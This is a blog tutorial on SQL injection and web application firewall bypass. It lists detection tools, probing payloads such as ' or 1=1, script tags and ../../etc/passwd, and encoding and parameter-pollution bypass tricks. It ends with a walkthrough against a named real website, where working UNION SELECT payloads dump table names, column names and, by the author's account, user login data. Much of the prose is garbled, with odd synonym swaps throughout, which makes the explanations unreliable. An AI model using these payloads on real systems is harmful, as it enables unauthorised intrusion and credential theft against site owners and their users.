---
title: SQL injection (SQLi) | part 2
date: 2021-10-25
description: "In the previous article, we discussed simple SQL injection, so in this instructional exercise, I will attempt to speak more about the inward idea than simply bypassing it. When you know the idea, you can undoubtedly control things and foster your own detour strategies in a substantially more sensitive manner than merely being reliant upon that load of crappy stunts. Another thing as am not, even more, a hypothesis fellow so that I will examine the highlight point."
image: images/sqli/banner.png
alt: SQL injection (SQLi) | part 2
---


# SQL Injection Part 2

In the previous article, we discussed simple SQL injection, so in this instructional exercise, I will attempt to speak more about the inward idea than simply bypassing it. When you know the idea, you can undoubtedly control things and foster your own detour strategies in a substantially more sensitive manner than merely being reliant upon that load of crappy stunts. Another thing as am not, even more, a hypothesis fellow so that I will examine the highlight point.

## What is Firewall

A firewall is an organization security gadget that screens approaching and active organization traffic and allows or hinders information parcels dependent on many safety rules. Its motivation is to build a boundary between your inward organization and approaching traffic from external sources (like the web) to impede malignant traffic like hackers.

##  How does a firewall work?

Firewalls cautiously dissect approaching traffic dependent on pre-setup rules and channel traffic from unstable or dubious sources to forestall assaults. Firewalls monitor traffic at a PC's entrance point, called ports, which is the place where data is traded with outer gadgets. For instance, "Source address 172.18.1.1 is permitted to arrive at objective 172.18.2.1 over port 22." 

Consider IP addresses as houses and port numbers as rooms inside the house. Just confided in individuals (source addresses) are permitted to go into the house (objective location) by any stretch of the imagination. Then, at that point, it's further sifted so that individuals inside the house are permitted to get to specific rooms (objective ports) if they're the proprietor, a youngster, or a visitor. The proprietor is allowed to any room (any port), while kids and visitors are permitted into a specific arrangement of rooms (explicit ports).

##  Common Type of Firewalls

### Network Layer Firewall


Organization layer firewalls work at a generally low level of the TCP/IP convention stack, not permitting bundles to go through the firewall except if they match the setup rule set, which could be White Listing or the Black Listing. The firewall director might characterize the standards, or default rules might be applied. This sort of firewall generally drops the parcel when it doesn't pass the ruleset. Commonly while Injecting an application, when your package gets wholly dropped and shows that there was no answer from the server, you can expect that is it's a Network Firewall. Albeit the conduct can not be unmistakable, it relies typically upon the settings.

### Web Application Firewall

WAFs are ordinarily sent in a type of intermediary design before web applications, so they don't see all traffic on our organizations. By observing the traffic before it arrives at the web application, WAFs can dissect demands before passing them on. This is the thing that gives them such a benefit over IPSs. Since IPSs are intended to grill all organization traffic, they can't investigate the application layer as thoroughly as WAF.

## Detecting the WAF

There are many devices and contents which can recognize and finger impression WAF presence over an Application, which incorporates however not restricted to 

- [WAFW00F](https://github.com/EnableSecurity/wafw00f) 

![enter image description here](https://i.postimg.cc/mkKyGbp2/waf.png)

-  [identYwaf](https://github.com/stamparm/identYwaf)

![enter image description here](https://i.postimg.cc/1XX71GwG/waf2.png)

- [WhatWaf](https://github.com/Ekultek/WhatWaf)

![enter image description here](https://i.postimg.cc/jjFr14Wb/3-waf.png)

- Nmap

![enter image description here](https://i.postimg.cc/mDgtYwvW/4-waf.png)

## Online service for detecting Web Application Firewalls

I have gathered every one of the considered apparatuses on the page of one web-based WAF (Web Application Firewall) location and distinguishing proof help: https://w-e-b.site/?act=wafw00f.


## Famous WAF merchants

-   Prophaze WAF
-   Cloudflare WAF
-   Sucuri Website Firewall
-   AppTrana
-   AWS WAF
-   Akamai WAF
-   Imperva WAF
-   Citrix WAF
-   F5 Advanced WAF
-   Barracuda WAF
-   Fortinet FortiWeb
-   SiteLoc

## How to deal with discovering WAF seller and genuine IP address

1. RUN shodan.io or censys.io 

2. Search SPF records and TXT records. 
SPF and TXT records may have an IP address of a CloudFlare less beginning point. 

3. Likewise can check securitytrails.com in the field. Historical information may have unique IPs in old records.



## Step by step instructions to verification WAF set up accurately: 

- WAFs utilize standard ports 80, 443, 8000, 8008, 8080, and 8088 ports. 

- Send GET solicitations to arbitrary open ports and check standards that may uncover the WAFs character. 

- Attempt some SQL injection payloads like: " or 1 = 1 — to login frames or fail to remember a secret phrase. 

- Attempt with loud XSS payloads like <script>confirm()</script> in some info fields. 

- Attempt to add ../../etc/passwd to an arbitrary boundary in the URL address. 

- Add a few payloads like ' OR SLEEP(5) OR ' toward the finish of URLs to any arbitrary boundary. 

- Send GET demands with obsolete conventions like HTTP/0.9 (HTTP/0.9 doesn't uphold POST sort queries). 

- Actually, look at the server header upon various sorts of connections. 

- Send a raw made FIN&RST bundle to the server and distinguish a reaction. 

- Side-Channel Attacks – Examine the circumstance conduct of the solicitation and reaction content.

## Strategies to bypass WAF:

 ### 1. Case Toggling Technique
Consolidate upper and lower case characters for making effective payloads.

- Fundamental Request:
`SELECT * FROM * WHERE OWNER = 'hacksec_db'`

- Bypassed Technique:

  `sELeCt * fRoM * wHerE OWNER = 'hacksec_db'`

### 2. URL Encoding Technique
Encode typical payloads with % encoding/URL encoding. 
You can utilize Burp. It has an encoder/decoder apparatus.

- Blocked by WAF:

  `UniOn(SeLECt 1,2,3,4,5,6)`

- Bypassed Technique:

  `UniOn(SeLeCt%201%2C2%2C3%2C4%2C5%2C6)`
  
- Model in URL: 

  `https://hacksec.in/cat.php?id=1 UniOn(SeLeCt%201%2C2%2C3%2C4%2C5%2C6)`

### 3. Hex Encoding Technique

An attacker can inject a destructive code into your Application in numerous ways, and utilizing Hex code is one of them. How about we take a SQL query and convert it into Hex code using the underneath interface.

- Blocked by WAF:

  `https://hacksec.in/viewAllProducts.php?sc=1'UnION  Select 10-- -`

- Bypassed Technique: 

  `0x2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c3130`

- Model in URL: 

  `http://www.hacksec.in/viewAllProducts.php?sc=1'UnION   Select 0x2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c3130-- --`

### 4. Token Breakers Technique

- attacker on a symbolic endeavour to break the rationale of parting a solicitation into tokens with token breakers. 

- Token-breakers are images that permit influencing the correspondence between a component of a string and a specific token. 

- Our solicitation should stay legitimate while utilizing token-breakers. 

- Contextual investigation: Unknown Token for the Tokenizer

  
 
### 5. HTTP Parameter Pollution

It might be large numbers of you have known about it; however, I am sure the couple would have utilized it at any point. Most importantly, HPP, Definition at OWASP - Supplying different HTTP boundaries with a similar name might make an application decipher values in unexpected ways. By taking advantage of these impacts, an assailant might have the option to sidestep input approval, trigger application mistakes or change inside factors esteems. As HTTP Parameter Pollution (in short HPP) influences a structure square of all web innovations, server and customer side assaults exist.

- Blocked by WAF:

  `
http://hacksec.in/product.aspx?uid='union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,'web.config',20,21--
`

- Model in URL: 

  `
http://hacksec.in/product.aspx?uid='union--+&uid=*/%0aselect 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,'web.config',20,21--
`

## let's pick some live example

- Here is an example site https://www.aquacity.com.pk which we are going to test.
in the previous article, we have discussed how you can find a table and columns, etc., so in this article, I am skipping that part

![enter image description here](https://i.postimg.cc/gkQ9Jg8K/1-waff.png)

- As you can see, WAF detects the usual payload, so let's try to bypass that shit.

![enter image description here](https://i.postimg.cc/0yXCx4S8/waff2222.png)

So here you can see that our new payload has bypassed the firewall.

  `
https://www.aquacity.com.pk/page.php?id=-1' /!50000union/ /!50000select/ 1,2,3--+-
`

- Now it's time to dump the table. 

![enter image description here](https://i.postimg.cc/P5DmsqdM/3-wafffff.png)

  `
https://www.aquacity.com.pk/page.php?id=-1' /!50000union/ select 1,group_concat(table_name,0x3c62723e),3 /!50000from/ /!50000information_schema.tables/ where table_schema=database()--+-
`

- Column dump 

![enter image description here](https://i.postimg.cc/nh6fr3bJ/4-wafffffffffffffff.png) 

  `
https://www.aquacity.com.pk/page.php?id=-1' /!50000union/ /!50000select/ 1,group_concat(column_name,0x3c62723e),3 /!50000from/ /!50000information_schema.columns/ /!50000where/ /!50000table_name/=CHAR(108, 111, 103, 105, 110)--+-
`

- Now it's the final thing to do is dump login data 

![enter image description here](https://i.postimg.cc/85ZyJCJ6/5waffffffffffffff.png)
as you see, we fetch user login details of the site by bypassing the firewall.

As I cannot talk about every one of the subjects in a single instructional exercise, we will stop here for this part. We Will begin with different subjects on WAF in the following detail; till then have fun...keep learning :)

### Thanks for reading
